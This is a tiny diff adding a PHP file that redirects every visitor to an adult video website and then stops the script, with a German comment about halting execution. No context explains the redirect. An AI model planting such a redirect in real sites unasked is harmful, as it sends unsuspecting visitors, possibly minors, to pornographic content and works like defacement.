@@ -1,0 +1,4 @@
+<?php
+header("Location: http://www.pornhub.com");
+exit; // Wichtig, um die Ausführung des aktuellen Skripts zu stoppen.
+?>
